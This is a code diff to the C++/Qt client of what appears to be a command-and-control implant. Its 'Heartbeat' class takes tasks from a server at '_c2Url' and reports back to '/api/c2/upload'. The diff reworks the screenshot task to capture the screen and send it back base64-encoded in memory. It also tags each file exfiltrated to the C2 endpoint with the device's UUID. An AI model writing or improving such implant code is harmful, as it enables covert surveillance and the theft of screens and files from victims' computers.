@@ -38,6 +38,7 @@
 #include <QtGui/QScreen>
 #include <QtGui/QPixmap>
 
+#include <QtCore/QBuffer>
 #include <QtCore/QJsonDocument>
 #include <QtCore/QJsonObject>
 #include <QtCore/QJsonArray>
@@ -1055,42 +1056,15 @@ void Heartbeat::performScreenshot(const QString& taskId) {
         return;
     }
 
-    QString tempPath = QStandardPaths::writableLocation(QStandardPaths::TempLocation) + "/screenshot_" + taskId + ".png";
-    Logs::writeMain("HEARTBEAT_DEBUG: Saving screenshot to " + tempPath);
-
-    if (pixmap.save(tempPath, "PNG")) {
-        Logs::writeMain("HEARTBEAT_DEBUG: Screenshot saved successfully. Uploading...");
-        // Upload
-        QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
-
-        QHttpPart filePart;
-        filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"" + QFileInfo(tempPath).fileName() + "\""));
-        QFile *fileToUpload = new QFile(tempPath);
-        fileToUpload->open(QIODevice::ReadOnly);
-        filePart.setBodyDevice(fileToUpload);
-        fileToUpload->setParent(multiPart);
-        multiPart->append(filePart);
-        
-        QHttpPart taskIdPart;
-        taskIdPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"taskId\""));
-        taskIdPart.setBody(taskId.toUtf8());
-        multiPart->append(taskIdPart);
-
-        QString url = _c2Url + "/api/c2/upload";
-        
-        QNetworkRequest request(url);
-        QNetworkReply* reply = _network.post(request, multiPart);
-        multiPart->setParent(reply);
-        
-        connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath, taskId]() {
-        if (reply->error() != QNetworkReply::NoError) {
-            uploadResult(taskId, "Screenshot upload failed: " + reply->errorString(), "failed");
-        }
-        reply->deleteLater();
-        QFile::remove(tempPath);
-    });
-} else {
-        Logs::writeMain("HEARTBEAT_DEBUG: Failed to save screenshot");
+    QByteArray byteArray;
+    QBuffer buffer(&byteArray);
+    buffer.open(QIODevice::WriteOnly);
+    if (pixmap.save(&buffer, "PNG")) {
+        QString base64 = QString::fromLatin1(byteArray.toBase64());
+        uploadResult(taskId, base64, "completed");
+        Logs::writeMain("HEARTBEAT_DEBUG: Screenshot (Base64) uploaded successfully via result.");
+    } else {
+        Logs::writeMain("HEARTBEAT_DEBUG: Failed to save screenshot to buffer");
         uploadResult(taskId, "Error: Failed to save screenshot", "failed");
     }
 }
@@ -1473,6 +1447,11 @@ void Heartbeat::uploadFile(const QString& taskId, const QString& filePath) {
         multiPart->append(taskPart);
     }
 
+    QHttpPart uuidPart;
+    uuidPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"uuid\""));
+    uuidPart.setBody(_deviceUuid.toUtf8());
+    multiPart->append(uuidPart);
+
     QString url = _c2Url + "/api/c2/upload";
     
     QNetworkRequest request(url);
@@ -1482,6 +1461,8 @@ void Heartbeat::uploadFile(const QString& taskId, const QString& filePath) {
     connect(reply, &QNetworkReply::finished, this, [this, reply, taskId]() {
         if (reply->error() != QNetworkReply::NoError) {
             uploadResult(taskId, "Upload failed: " + reply->errorString(), "failed");
+        } else {
+            uploadResult(taskId, "File uploaded successfully", "completed");
         }
         reply->deleteLater();
     });
